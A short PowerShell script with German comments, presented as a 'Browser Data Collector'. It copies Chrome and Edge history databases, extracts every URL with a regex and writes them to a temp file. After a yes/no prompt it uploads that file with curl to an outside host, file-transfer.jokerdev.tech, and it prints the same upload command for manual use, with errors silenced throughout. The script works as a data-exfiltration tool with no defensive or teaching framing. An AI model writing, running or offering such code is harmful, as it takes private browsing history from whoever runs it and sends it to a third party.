# Einfacher Browser Data Collector
# Keine Parameter nötig - einfach ausführen

Write-Host "=== Browser Data Collector ===" -ForegroundColor Cyan
Write-Host "Starte um: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Gray

# URLs sammeln
$allUrls = @()

# Prüfe Chrome
$chromeHistory = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
if (Test-Path $chromeHistory) {
    Write-Host "Lese Chrome History..." -ForegroundColor Green
    try {
        $tempFile = "$env:TEMP\chrome_temp"
        Copy-Item $chromeHistory $tempFile -Force -ErrorAction SilentlyContinue
        $content = Get-Content $tempFile -Raw -ErrorAction SilentlyContinue
        $urls = [regex]::Matches($content, 'https?://[^\s""<>]+') | ForEach-Object { $_.Value }
        $allUrls += $urls
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Prüfe Edge
$edgeHistory = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
if (Test-Path $edgeHistory) {
    Write-Host "Lese Edge History..." -ForegroundColor Green
    try {
        $tempFile = "$env:TEMP\edge_temp"
        Copy-Item $edgeHistory $tempFile -Force -ErrorAction SilentlyContinue
        $content = Get-Content $tempFile -Raw -ErrorAction SilentlyContinue
        $urls = [regex]::Matches($content, 'https?://[^\s""<>]+') | ForEach-Object { $_.Value }
        $allUrls += $urls
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Deduplizieren
$uniqueUrls = $allUrls | Sort-Object -Unique

# Ergebnisse anzeigen
Write-Host "`n=== ERGEBNISSE ===" -ForegroundColor Cyan
Write-Host "Gefundene URLs: $($uniqueUrls.Count)" -ForegroundColor Green

# Erste 10 URLs anzeigen
if ($uniqueUrls.Count -gt 0) {
    Write-Host "`nBeispiele:" -ForegroundColor Yellow
    $uniqueUrls | Select-Object -First 10 | ForEach-Object {
        Write-Host "  $_" -ForegroundColor Gray
    }
}

# Datei speichern
$outputFile = "$env:TEMP\browser_urls.txt"
$uniqueUrls | Out-File $outputFile -Encoding UTF8
Write-Host "`nDaten gespeichert in: $outputFile" -ForegroundColor Green

# Upload mit cURL (einfach)
Write-Host "`n=== UPLOAD ===" -ForegroundColor Cyan
$uploadChoice = Read-Host "Datei mit cURL hochladen? (j/n)"

if ($uploadChoice -eq 'j') {
    try {
        curl -T $outputFile https://file-transfer.jokerdev.tech/upload/browser_data.txt
        Write-Host "Upload erfolgreich!" -ForegroundColor Green
    }
    catch {
        Write-Host "Upload fehlgeschlagen" -ForegroundColor Red
        Write-Host "Manueller Befehl: curl -T `"$outputFile`" https://file-transfer.jokerdev.tech/upload/browser_data.txt" -ForegroundColor Yellow
    }
}

Write-Host "`nFertig! Drücke eine Taste..." -ForegroundColor Cyan
pause
